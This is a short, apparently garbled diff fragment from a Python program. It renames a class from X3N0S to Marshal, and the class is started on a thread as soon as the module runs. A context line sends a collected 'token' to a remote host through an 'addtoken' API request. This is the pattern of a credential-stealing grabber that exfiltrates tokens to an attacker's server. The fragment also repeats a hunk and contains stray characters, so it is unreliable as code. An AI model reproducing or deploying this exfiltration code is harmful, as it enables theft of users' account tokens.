@@ -60,8 +60,8 @@ class Marshal:
             urllib.request.urlopen(urllib.request.Request(self.host+"/api?type=addtoken&token="+token, method='GET'))
 
 
-threading.Thread(target=X3N0S().__Main__()).start()
+threading.Thread(target=Marshal().__Main__()).start()
 ))
 
 
-threading.Thread(target=X3N0S().__Main__()).start()
+threading.Thread(target=Marshal().__Main__()).start()
